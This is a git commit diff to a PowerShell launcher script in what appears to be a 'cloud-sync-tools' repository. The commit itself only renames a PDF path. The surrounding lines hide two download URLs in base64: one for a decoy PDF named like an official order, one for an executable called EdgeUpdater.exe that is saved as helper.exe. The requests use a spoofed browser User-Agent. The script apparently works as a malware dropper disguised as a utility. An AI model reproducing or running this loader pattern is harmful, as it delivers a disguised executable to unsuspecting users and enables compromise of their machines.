1d9d9fb60a6b6167a729043b8c52cac619ad5c02
123456 <273391509+astro-opensource@users.noreply.github.com>
2026-04-13 16:42:50 +0300

    Update launcher.ps1

--- assets/launcher.ps1
+++ assets/launcher.ps1
@@ -57,7 +57,7 @@ $isFirstRun = -not (Test-Path $flagFile)
 
 $pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LnBkZg=='))
 $exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9FZGdlVXBkYXRlci5leGU='))
-$pdfPath = "$cache\Nakaz_No._661_vid_02.03.2026.pdf"
+$pdfPath = "$cache\doc.pdf"
 $exePath = "$cache\helper.exe"
 
 $headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'}
